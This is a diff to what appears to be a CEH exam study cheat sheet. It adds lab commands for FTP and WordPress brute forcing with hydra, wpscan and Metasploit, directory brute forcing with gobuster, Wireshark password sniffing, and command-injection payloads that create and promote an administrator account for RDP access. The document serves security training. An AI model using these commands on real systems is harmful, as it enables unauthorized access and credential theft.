@@ -151,7 +151,8 @@ Check MySQL service running- nmap -p 3306 -iL ip.txt | grep open        (ip.txt 
   http.request.method == POST   (for passwords) or click tools ---> credentials Also
   ```
 
- * Password Sniffing using Wireshark -In pcap file apply filter:- (you will get all the post request) Now to capture password click on edit in menu bar, then near Find packet section, on the "display filter" select "string", also select "Packet details" from the drop down of "Packet list", also change "narrow & wide" to "Narrow UTF-8 & ASCII", and then type "pwd" in the find section.
+ * Password Sniffing using Wireshark
+In pcap file apply filter:- (you will get all the post request) Now to capture password click on edit in menu bar, then near Find packet section, on the "display filter" select "string", also select "Packet details" from the drop down of "Packet list", also change "narrow & wide" to "Narrow UTF-8 & ASCII", and then type "pwd" in the find section.
 ```console
 http.request.method==POST
 ```
@@ -253,21 +254,56 @@ john SMBfilename
 	
 <summary>HACKING WEB</summary>
 
+@@ Hacking Web servers
+
 ```console
 1- Footprinting web server Using Netcat and Telnet- nc -vv www.movies.com 80
 						    GET /HTTP/1.0
 						    telnet www.movies.com 80
 						    GET /HTTP/1.0
-2- Enumerate Web server info using nmap-  nmap -sV --script=http-enum www.movies.com
-3- Crack FTP credentials using nmap-  nmap -p 21 10.10.10.10 (check if it is open or not)
-				      ftp 10.10.10.10 (To see if it is directly connecting or needing credentials)
-Then go to Desktop and in Ceh tools folder you will find wordlists, here you will find usernames and passwords file.
-Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10
 
+2- Enumerate Web server info using nmap-  nmap -sV --script=http-enum www.movies.com
+
+3- Crack FTP port using nmap-
+nmap -p 21 10.10.10.10 (check if it is open or not)
+
+ftp 10.10.10.10 (To see if it is directly connecting or need credentials if need. Then go to Desktop and in Ceh tools folder you will find wordlists, here you will find usernames and passwords file. )
+
+Now in terminal type-
+hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10
+or
 hydra -l user -P passlist.txt ftp://10.10.10.10
 ```
 
+@@ Hacking Web Application
+```console
+1- Scan Using OWASP ZAP (Parrot)- Type 'zaproxy' in the terminal and then it would open. In target tab put the url and click automated scan.
 
+2- Directory Bruteforcing
+gobuster dir -u 10.10.10.10 -w /home/attacker/Desktop/common.txt
+
+3- Enumerate a Web Application using WPscan & Metasploit BFA- (u means username) 
+wpscan --url http://10.10.10.10:8080/NEW --enumerate u  
+
+Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wordpress_login_enum
+ 						 show options
+						 set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
+						 set RHOSTS 10.10.10.10  (target ip)
+						 set RPORT 8080          (target port)
+						 set TARGETURI http://10.10.10.10:8080/
+						 set USERNAME admin
+
+4- Brute Force using WPscan -    wpscan --url http://10.10.10.10:8080/NEW -u root -P passwdfile.txt (Use this only after enumerating the user like in step 3)
+			         wpscan --url http://10.10.10.10:8080/NEW --usernames userlist.txt, --passwords passwdlist.txt 
+
+5- Command Injection-  | net user  (Find users)
+ 		       | dir C:\  (directory listing)
+                       | net user Test/Add  (Add a user)
+		       | net user Test      (Check a user)
+		       | net localgroup Administrators Test/Add   (To convert the test account to admin)
+		       | net user Test      (Once again check to see if it has become administrator)
+Now you can do a RDP connection with the given ip and the Test account which you created.
+```
  </details>
 <details>
 
